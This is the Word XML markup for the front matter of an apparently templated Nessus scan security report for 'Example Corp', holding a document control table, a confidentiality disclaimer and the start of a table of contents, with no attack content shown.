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875" w:rsidRDefault="00BA0C82">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Garamond" w:eastAsia="Garamond" w:hAnsi="Garamond" w:cs="Garamond"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="0" distR="0" simplePos="0" relativeHeight="251658240" behindDoc="0" locked="0" layoutInCell="1" hidden="0" allowOverlap="1" wp14:anchorId="62A37AF6" wp14:editId="34B11E1D">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>-914400</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="7863840" cy="10271760"/>
            <wp:effectExtent l="0" t="0" r="3810" b="0"/>
            <wp:wrapSquare wrapText="bothSides" distT="0" distB="0" distL="0" distR="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a:srcRect l="-35" r="960"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="7863840" cy="1027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979F6">
        <w:rPr>
          <w:rFonts w:ascii="Garamond" w:eastAsia="Garamond" w:hAnsi="Garamond" w:cs="Garamond"/>
        </w:rPr>
        <w:t>de</w:t>
      </w:r>
      <w:r w:rsidR="008979F6">
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="00944875">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="0" w:name="_heading=h.gjdgxs" w:colFirst="0" w:colLast="0"/>
      <w:bookmarkEnd w:id="0"/>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="00944875">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="00944875">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="00944875">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="008979F6">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1" w:name="_Toc143392731"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>Document Control</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1"/>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="00944875">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="a"/>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70"/>
        <w:gridCol w:w="3555"/>
      </w:tblGrid>
      <w:tr w:rsidR="00944875">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1875" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:tcMar>
              <w:top w:w="100" w:type="dxa"/>
              <w:left w:w="100" w:type="dxa"/>
              <w:bottom w:w="100" w:type="dxa"/>
              <w:right w:w="100" w:type="dxa"/>
            </w:tcMar>
          </w:tcPr>
          <w:p w:rsidR="00944875" w:rsidRDefault="008979F6">
            <w:pPr>
              <w:widowControl w:val="0"/>
              <w:rPr>
                <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
                <w:b/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
                <w:b/>
              </w:rPr>
              <w:t>Document Version</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3270" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:tcMar>
              <w:top w:w="100" w:type="dxa"/>
              <w:left w:w="100" w:type="dxa"/>
              <w:bottom w:w="100" w:type="dxa"/>
              <w:right w:w="100" w:type="dxa"/>
            </w:tcMar>
          </w:tcPr>
          <w:p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Owner &amp; Role</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3555" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:tcMar>
              <w:top w:w="100" w:type="dxa"/>
              <w:left w:w="100" w:type="dxa"/>
              <w:bottom w:w="100" w:type="dxa"/>
              <w:right w:w="100" w:type="dxa"/>
            </w:tcMar>
          </w:tcPr>
          <w:p w:rsidR="00944875" w:rsidRDefault="008979F6">
            <w:pPr>
              <w:widowControl w:val="0"/>
              <w:pBdr>
                <w:top w:val="nil"/>
                <w:left w:val="nil"/>
                <w:bottom w:val="nil"/>
                <w:right w:val="nil"/>
                <w:between w:val="nil"/>
              </w:pBdr>
              <w:rPr>
                <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
                <w:b/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
                <w:b/>
              </w:rPr>
              <w:t>Status &amp; comments</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00944875">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1875" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:tcMar>
              <w:top w:w="100" w:type="dxa"/>
              <w:left w:w="100" w:type="dxa"/>
              <w:bottom w:w="100" w:type="dxa"/>
              <w:right w:w="100" w:type="dxa"/>
            </w:tcMar>
          </w:tcPr>
          <w:p w:rsidR="00944875" w:rsidRDefault="008979F6">
            <w:pPr>
              <w:widowControl w:val="0"/>
              <w:pBdr>
                <w:top w:val="nil"/>
                <w:left w:val="nil"/>
                <w:bottom w:val="nil"/>
                <w:right w:val="nil"/>
                <w:between w:val="nil"/>
              </w:pBdr>
              <w:rPr>
                <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
              </w:rPr>
              <w:t>v1.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3270" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:tcMar>
              <w:top w:w="100" w:type="dxa"/>
              <w:left w:w="100" w:type="dxa"/>
              <w:bottom w:w="100" w:type="dxa"/>
              <w:right w:w="100" w:type="dxa"/>
            </w:tcMar>
          </w:tcPr>
          <w:p w:rsidR="00944875" w:rsidRDefault="00B438D6">
            <w:pPr>
              <w:widowControl w:val="0"/>
              <w:pBdr>
                <w:top w:val="nil"/>
                <w:left w:val="nil"/>
                <w:bottom w:val="nil"/>
                <w:right w:val="nil"/>
                <w:between w:val="nil"/>
              </w:pBdr>
              <w:rPr>
                <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
              </w:rPr>
              <w:t xml:space="preserve">Tommy Tran Duc Thang </w:t>
            </w:r>
            <w:r w:rsidR="008979F6">
              <w:rPr>
                <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
              </w:rPr>
              <w:t>– Security Analyst</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3555" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:tcMar>
              <w:top w:w="100" w:type="dxa"/>
              <w:left w:w="100" w:type="dxa"/>
              <w:bottom w:w="100" w:type="dxa"/>
              <w:right w:w="100" w:type="dxa"/>
            </w:tcMar>
          </w:tcPr>
          <w:p w:rsidR="00944875" w:rsidRDefault="00B352B4" w:rsidP="00B352B4">
            <w:pPr>
              <w:widowControl w:val="0"/>
              <w:pBdr>
                <w:top w:val="nil"/>
                <w:left w:val="nil"/>
                <w:bottom w:val="nil"/>
                <w:right w:val="nil"/>
                <w:between w:val="nil"/>
              </w:pBdr>
              <w:rPr>
                <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
              </w:rPr>
              <w:t xml:space="preserve">14-08-2020 </w:t>
            </w:r>
            <w:r w:rsidR="008979F6">
              <w:rPr>
                <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
              </w:rPr>
              <w:t xml:space="preserve">Internal Draft </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
              </w:rPr>
              <w:t>Nessus Scan</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00944875" w:rsidRDefault="00944875">
      <w:pPr>
        <w:jc w:val="right"/>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="00944875">
      <w:pPr>
        <w:jc w:val="right"/>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="00944875">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="00944875">
      <w:pPr>
        <w:jc w:val="right"/>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="008979F6">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="2" w:name="_heading=h.1fob9te" w:colFirst="0" w:colLast="0"/>
      <w:bookmarkEnd w:id="2"/>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="00944875">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="00944875">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="008979F6">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="3" w:name="_Toc143392732"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>Legal Disclaimer</w:t>
      </w:r>
      <w:bookmarkEnd w:id="3"/>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="008979F6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">The content of this report is highly confidential and may include critical information on Example Corp systems, network, and applications. The report should be shared only with intended parties. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="00944875">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="008979F6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Although maximum effort has been applied to make this report accurate, Example Corp, Security Audit Team cannot be held responsible for inaccuracies or system changes after the report has been issued since new vulnerabilities may be found once the tests are completed. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="00944875">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="008979F6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Guidance should be taken from a Legal Counsel, CISO and Blue Team on how best to implement the recommendations. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="00944875">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="008979F6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">All other information and the formats, methods, and reporting approaches is the intellectual property of Example Corp and is considered proprietary information and is provided for the purpose of internal use only.  </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="00944875">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="008979F6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Any copying, distribution, or use of any of the information set forth herein or in any attachments hereto form outside of Example Corp authorized representatives is strictly prohibited.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="008979F6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial Black" w:eastAsia="Arial Black" w:hAnsi="Arial Black" w:cs="Arial Black"/>
          <w:b/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="008979F6">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="4" w:name="_Toc143392733"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Table of Contents</w:t>
      </w:r>
      <w:bookmarkEnd w:id="4"/>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="00944875">
      <w:pPr>
        <w:keepNext/>
        <w:keepLines/>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="480" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:b/>
          <w:color w:val="366091"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:sdt>
      <w:sdtPr>
        <w:id w:val="-1086000596"/>
        <w:docPartObj>
          <w:docPartGallery w:val="Table of Contents"/>
          <w:docPartUnique/>
        </w:docPartObj>
      </w:sdtPr>
      <w:sdtEndPr/>
      <w:sdtContent>
        <w:p w:rsidR="009D1794" w:rsidRDefault="008979F6">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>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43392731" w:history="1">
            <w:r w:rsidR="009D1794" w:rsidRPr="003F4BE5">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Document Control</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc143392731 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00315CB9">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>2</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32" w:history="1">
            <w:r w:rsidR="009D1794" w:rsidRPr="003F4BE5">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Legal Disclaimer</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc143392732 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00315CB9">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>3</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33" w:history="1">
            <w:r w:rsidR="009D1794" w:rsidRPr="003F4BE5">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Table of Contents</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc143392733 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00315CB9">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="009D1794" w:rsidRDefault="007A53C5">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="660"/>
              <w:tab w:val="right" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
              <w:noProof/>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc143392734" w:history="1">
            <w:r w:rsidR="009D1794" w:rsidRPr="003F4BE5">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
                <w:noProof/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="009D1794" w:rsidRPr="003F4BE5">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Executive Summary</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc143392734 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00315CB9">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="009D1794" w:rsidRDefault="007A53C5">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="660"/>
              <w:tab w:val="right" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
              <w:noProof/>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc143392735" w:history="1">
            <w:r w:rsidR="009D1794" w:rsidRPr="003F4BE5">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
                <w:noProof/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="009D1794" w:rsidRPr="003F4BE5">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
                <w:noProof/>
              </w:rPr>
              <w:t>A Glance Through Target Security Posture</w:t>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc143392735 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="009D1794">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
